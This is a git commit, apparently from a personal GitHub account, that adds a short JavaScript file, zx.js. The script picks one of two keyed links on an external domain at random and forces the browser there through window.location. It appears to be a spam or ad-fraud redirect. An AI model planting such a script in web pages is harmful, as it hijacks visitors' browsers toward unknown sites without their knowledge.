ff890c73129b71a2b66905739236186a1117708a
rezoniz <92806482+rezoniz@users.noreply.github.com>
2021-10-19 23:03:08 +0800

    Create zx.js

---
+++ zx.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+
+  'https://inquiryclank.com/dxiuery63?key=cf0fc5a80431a064d30fa468e34601e1','https://inquiryclank.com/eikrtic3ch?key=688cd8bebbfaef19f2275388fba012b6'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
